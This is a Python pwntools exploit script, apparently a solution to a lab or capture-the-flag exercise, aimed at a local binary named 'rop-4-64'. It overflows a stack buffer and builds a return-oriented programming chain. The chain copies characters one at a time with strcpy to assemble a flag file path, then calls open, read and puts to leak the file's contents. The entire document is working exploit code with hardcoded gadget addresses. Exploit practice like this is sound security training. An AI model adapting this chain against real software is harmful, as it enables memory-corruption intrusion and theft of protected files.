#!/usr/bin/env python

from pwn import *

p = process('./rop-4-64')

buf = "A" * 0x88

"""
0x00000000004005a0  printf@plt
0x00000000004005b0  read@plt
0x00000000004005d0  open@plt
0x00000000004006e2  strcpy
0x0000000000400570  puts@plt
"""

strcpy = p64(0x00000000004006e2)
openAddr = p64(0x00000000004005d0)
read = p64(0x00000000004005b0)
printf = p64(0x00000000004005a0)
puts = p64(0x0000000000400570)

"""
0x0000000000400863 : pop rdi ; ret
0x000000000040073f : pop rdx ; nop ; pop rbp ; ret
0x0000000000400861 : pop rsi ; pop r15 ; ret
"""

pop_rdi = p64(0x0000000000400863)
pop_rdx_rbp = p64(0x000000000040073f)
pop_rsi_r15 = p64(0x0000000000400861)

memory = 0x601800
flag = 0x601900

"""
0x8048768:  |    the quick brown  |     fox jumps over t |     he lazy dog!
            | 0  0123456789abcdef | 10  0123456789abcdef | 20  0123456789ab

0x8048798:  |    I also put this  |     for you: 1234567 |     89-
            | 0  0123456789abcdef | 10  0123456789abcdef | 20  012

0x80487e0: "/"

strcpy(dest, src, size)
"""

fox = 0x400890
special = 0x4008c0
slash = 0x400908

def builder (destItr, src, srcItr):
    string = pop_rdi
    string += p64(memory + destItr)
    string += pop_rsi_r15
    string += p64(src + srcItr)
    string += p64(0)
    string += strcpy
    return string

buf += builder(0, slash, 0)         # /
buf += builder(1, fox, 1)           # h
buf += builder(2, fox, 0xc)         # o
buf += builder(3, fox, 0x16)        # m
buf += builder(4, fox, 2)           # e
buf += builder(5, slash, 0)         # /
buf += builder(6, fox, 0x23)        # l
buf += builder(7, fox, 0x24)        # a
buf += builder(8, fox, 0xa)         # b
buf += builder(9, fox, 0x18)        # s
buf += builder(10, slash, 0)        # /
buf += builder(11, fox, 0xd)        # w
buf += builder(12, fox, 2)          # e
buf += builder(13, fox, 2)          # e
buf += builder(14, fox, 8)          # k
buf += builder(15, special, 0x1d)   # 5
buf += builder(16, slash, 0)        # /
buf += builder(17, fox, 0xb)        # r
buf += builder(18, fox, 0xc)        # o
buf += builder(19, fox, 0x17)       # p
buf += builder(20, special, 0x23)   # -
buf += builder(21, special, 0x1c)   # 4
buf += builder(22, special, 0x23)   # -
buf += builder(23, special, 0x1e)   # 6
buf += builder(24, special, 0x1c)   # 4
buf += builder(25, slash, 0)        # /
buf += builder(26, fox, 0x10)       # f
buf += builder(27, fox, 0x23)       # l
buf += builder(28, fox, 0x24)       # a
buf += builder(29, fox, 0x2a)       # g
buf += builder(30, slash, 1)        # \0

# open
buf += pop_rdi
buf += p64(memory)
buf += pop_rsi_r15
buf += p64(0)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0)
buf += p64(0)
buf += openAddr

# read
buf += pop_rdi
buf += p64(3)
buf += pop_rsi_r15
buf += p64(flag)
buf += p64(0)
buf += pop_rdx_rbp
buf += p64(0x100)
buf += p64(0)
buf += read

# printf
buf += pop_rdi
buf += p64(flag)
buf += puts

with open("buf.txt", "wb") as f:
        f.write(buf)

p.sendline(buf)
print(p.recv())
p.interactive()
